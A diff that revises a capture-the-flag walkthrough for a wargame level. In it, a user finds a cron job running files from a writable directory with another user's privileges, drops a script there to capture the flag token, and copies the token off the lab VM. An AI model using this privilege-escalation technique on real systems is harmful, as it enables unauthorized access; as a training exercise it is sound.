@@ -5,17 +5,18 @@
 1. __Observation__ (Guest): when connecting as the `level05` user,
 	the following message appears on stdout: `You have a new mail.`
 
-2. __Action__ (Guest): check the content of the `/var/mail` directory
+2. __Action__ (Guest): list the files present in the `/var/mail` directory
 	```sh
 	ls -A /var/mail
 	```
 
-3. __Observation__ (Guest): the previous command reveals a file named `level05`
+3. __Observation__ (Guest): the previous command reveals 1 file possibly of interest,
+	named `level05`
 	```
 	level05
 	```
 
-4. __Action__ (Guest): check the permissions of the `level05` file
+4. __Action__ (Guest): check the file access control list of the `level05` file
 	```sh
 	getfacl /var/mail/level05
 	```
@@ -39,8 +40,8 @@
 	cat /var/mail/level05
 	```
 
-7. __Observation__ (Guest): the `/var/mail/level05` file contains only 1 line,
-	which strongly resembles a `crontab` directive
+7. __Observation__ (Guest): the previous command reveals that the `level05` file
+	contains only 1 line that strongly resembles a `crontab` directive
 	```
 	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 	```
@@ -48,12 +49,12 @@
 	`su -c "sh /usr/sbin/openarenaserver" - flag05` shall be run, which means that the command
 	`sh /usr/sbin/openarenaserver` shall be run with the `flag05` user privileges.
 
-8. __Action__ (Guest): check the permissions of the `/usr/sbin/openarenaserver` file
+8. __Action__ (Guest): check the file access control list of the `openarenaserver` file
 	```sh
 	getfacl /usr/sbin/openarenaserver
 	```
 
-9. __Observation__ (Guest): the previous command reveals that the `/usr/sbin/openarenaserver` file
+9. __Observation__ (Guest): the previous command reveals that the `openarenaserver` file
 	is readable by the `level05` user
 	```
 	getfacl: Removing leading '/' from absolute path names
@@ -67,32 +68,37 @@
 	other::---
 	```
 
-10. __Action__ (Guest): print the content of the `/usr/sbin/openarenaserver` file
+10. __Action__ (Guest): print the content of the `openarenaserver` file
 	```sh
 	cat /usr/sbin/openarenaserver
 	```
 
-11. __Observation__ (Guest): the `/usr/sbin/openarenaserver` file is a shell script
-	that enumerates every non-hidden file located in the `/opt/openarenaserver` directory
+11. __Observation__ (Guest): the previous command reveals that the `openarenaserver` file
+	is a shell script that enumerates every non-hidden file
+	located in the `/opt/openarenaserver` directory
 	and runs each of them via `bash` in tracing mode (`-x`) before removing them (`rm -f`)
 	```sh
 	#!/bin/sh
 
 	for i in /opt/openarenaserver/* ; do
-		(ulimit -t 5; bash -x "$i")
+		( ulimit -t 5 ; bash -x "$i" )
 		rm -f "$i"
 	done
 	```
 
-12. __Action__ (Guest): check the permissions of the `/opt/openarenaserver` directory
+12. __Action__ (Guest): check the file access control list of the `/opt/openarenaserver` directory
 	```sh
 	getfacl /opt/openarenaserver
 	```
 
 13. __Observation__ (Guest): the previous command reveals
-	that the `/opt/openarenaserver` directory is:
-	- readable, writable, and executable by the `level05` user
-	- readable, writable, and executable by the `flag05` user
+	that the `/opt/openarenaserver` directory:
+	- is readable by the `level05` user
+	- is writable by the `level05` user
+	- is executable by the `level05` user
+	- is readable by the `flag05` user
+	- is writable by the `flag05` user
+	- is executable by the `flag05` user
 	```
 	getfacl: Removing leading '/' from absolute path names
 	# file: opt/openarenaserver
@@ -139,7 +145,7 @@
 17. __Observation__ (Guest): the previous command reveals that the `test.sh` script has been removed,
 	by printing the following message on stdout:  
 	`File has been removed`  
-	highly suggesting that the `usr/sbin/openarenaserver` script has been run,
+	highly suggesting that the `openarenaserver` script has been run,
 	and that the cron job described in the mail is effectively running.
 
 18. __Action__ (Guest): create a new shell script named `save_token_to_file.sh`
@@ -150,7 +156,7 @@
 	```sh
 	#!/bin/sh
 
-	getflag | grep -oE '[^ ]+$' >/opt/openarenaserver/.token
+	getflag | egrep -o '[^ ]+$' >/opt/openarenaserver/.token
 	```
 
 19. __Action__ (Guest): wait for the next even minute
@@ -182,7 +188,7 @@
 24. __Action__ (Host): copy the `.token` file from the virtual machine
 	```sh
 	sshpass -f level04/flag 2>/dev/null \
-		scp -P 4242 level05@192.168.122.214:/opt/openareanserver/.token level05/flag
+		scp -P 4242 level05@192.168.122.214:/opt/openarenaserver/.token level05/flag
 	```
 
 25. __Action__ (Guest): remove the `.token` file
